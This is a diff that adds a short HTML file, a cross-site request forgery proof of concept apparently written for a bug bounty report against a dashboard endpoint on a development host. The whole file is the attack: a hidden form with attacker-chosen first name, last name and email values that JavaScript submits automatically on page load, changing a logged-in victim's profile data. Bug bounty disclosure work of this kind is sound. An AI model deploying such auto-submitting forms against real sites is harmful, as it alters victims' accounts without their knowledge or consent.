@@ -1,0 +1,14 @@
+<!-- csrf-poc.html -->
+<html>
+  <body>
+    <form action="https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/dashboard/app_usage/681db1d0f909fe0fb7a84407?locale=en" method="POST" id="csrfForm">
+      <input type="hidden" name="first_name" value="Attacker">
+      <input type="hidden" name="last_name" value="Injected">
+      <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
